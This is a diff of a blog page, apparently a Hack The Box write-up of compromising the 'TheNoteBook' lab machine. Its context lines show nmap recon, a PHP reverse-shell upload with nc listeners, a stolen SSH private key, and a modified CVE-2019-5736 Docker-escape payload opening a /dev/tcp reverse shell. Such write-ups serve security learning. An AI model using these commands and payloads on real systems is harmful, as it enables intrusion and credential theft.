@@ -5,7 +5,7 @@
 <meta name=viewport content="width=device-width,initial-scale=1">
 <meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1">
 <meta name=author content="Nasef">
-<meta name=generator content="Hugo 0.87.0">
+<meta name=generator content="Hugo 0.88.1">
 <link rel=stylesheet href=https://iamnasef.com/css/bootstrap.min.css>
 <link rel=stylesheet href=https://iamnasef.com/font-awesome/css/font-awesome.min.css>
 <link href=https://iamnasef.com/scss/style.min.css rel=stylesheet>
@@ -62,7 +62,7 @@ I am Nasef and today I am going to show you how I hacked TheNoteBook machine fro
 <h3 id=recon>Recon</h3>
 <h5 id=nmap>nmap</h5>
 <p>Nmap found ssh (22), http (80)</p>
-<pre><code>nmap -sC -sV 10.10.10.230     
+<pre tabindex=0><code>nmap -sC -sV 10.10.10.230     
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-15 11:57 EDT
 Stats: 0:01:27 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
 Service scan Timing: About 50.00% done; ETC: 11:59 (0:00:06 remaining)
@@ -108,7 +108,7 @@ I tried it but it kept failing until I read <a href=https://blog.pentesteracadem
 <p>It worked!</p>
 <p><img src=/images/blog/012/4.png alt=image></p>
 <p>I found an upload functionality, so I started reverse shell <code>nc -lvnp 5555</code>, then uploaded pentester monkey php reverse shell and got initial shell</p>
-<pre><code>nc -lvnp 5555            
+<pre tabindex=0><code>nc -lvnp 5555            
 listening on [any] 5555 ...
 connect to [10.10.14.115] from (UNKNOWN) [10.10.10.230] 44594
 Linux thenotebook 4.15.0-135-generic #139-Ubuntu SMP Mon Jan 18 17:38:24 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
@@ -121,7 +121,7 @@ www-data
 
 </code></pre><h3 id=getting-into-noah>Getting into noah</h3>
 <p>I&rsquo;ve ran linpeas, and found and ssh keys stored in home directory of a user called noah</p>
-<pre><code>╔══════════╣ Analizing SSH FILES Files (limit 70)
+<pre tabindex=0><code>╔══════════╣ Analizing SSH FILES Files (limit 70)
 id_dsa* Not Found                                                                                                                                                                                                                   
                                                                                                                                                                                                                    
 -rw------- 1 www-data www-data 1679 Feb 17 08:59 /tmp/key/home/noah/.ssh/id_rsa
@@ -155,10 +155,10 @@ Uh6he5GM5rTstMjtGN+OQ0Z8UZ6c0HBM0ulkBT9IUIUEdLFntA4oAVQ=
 -rw-r--r-- 1 www-data www-data 398 Feb 17 08:59 /tmp/key/home/noah/.ssh/id_rsa.pub
 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKq5y/Po/8QRBt1/xwDjgaQSMJzdCcDKywQPeqr0/PUvEQ3TgduGEN8XEr4QNYrjKSTSDky8FByRzECzfWY2e75QKVgsxvhhca+uLAKu2sej+6XBOsvKapXPGMRstSQiCNk1bj0AHCLakN/OheeKP0kryzeKMij7D/RGofMB+BLdju35sdWjiS8gdPQhe94CK/F7PdSmK6UWRpDjOTfut8c7fC5NazJnS+YvuCvd9BEGd2tQO/iTbPB63Fg23SGN0sPID4oZYUV5bt7L3KeswpbaJza8G5wQBRR76ZvQRrM7aKeFetMBASBOts7uM2hkSl/gwNG3sNNDt1HP6Twcbj noah@thenotebook
 </code></pre><p>So, I ssh&rsquo;d into noah</p>
-<pre><code>ssh noah@10.10.10.230 -i id_rsa
+<pre tabindex=0><code>ssh noah@10.10.10.230 -i id_rsa
 </code></pre><h3 id=getting-into-root>Getting into Root</h3>
 <p>I ran sudo -l and found I was able to run commands in a docker container called webapp-dev01 as root without password</p>
-<pre><code>noah@thenotebook:~$ sudo -l
+<pre tabindex=0><code>noah@thenotebook:~$ sudo -l
 Matching Defaults entries for noah on thenotebook:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
@@ -168,9 +168,9 @@ User noah may run the following commands on thenotebook:
 </code></pre><p>so, I ran <code>sudo /usr/bin/docker exec -it webapp-dev01 /bin/bash</code> to get the root in the container</p>
 <p>I searched for an docker escape for this case and found <a href=https://github.com/Frichetten/CVE-2019-5736-PoC>This Exploit</a></p>
 <p>I modified the exploit to be able to make a reverse shell.</p>
-<pre><code>var payload = &quot;#!/bin/bash \n bash -i &gt;&amp; /dev/tcp/10.10.14.115/9999 0&gt;&amp;1&quot;
+<pre tabindex=0><code>var payload = &quot;#!/bin/bash \n bash -i &gt;&amp; /dev/tcp/10.10.14.115/9999 0&gt;&amp;1&quot;
 </code></pre><p>The started a reverse shell, and ran the exploit as explained in the README.md</p>
-<pre><code>nc -lvnp 9999            
+<pre tabindex=0><code>nc -lvnp 9999            
 listening on [any] 9999 ...
 connect to [10.10.14.115] from (UNKNOWN) [10.10.10.230] 36990
 bash: cannot set terminal process group (1636): Inappropriate ioctl for device
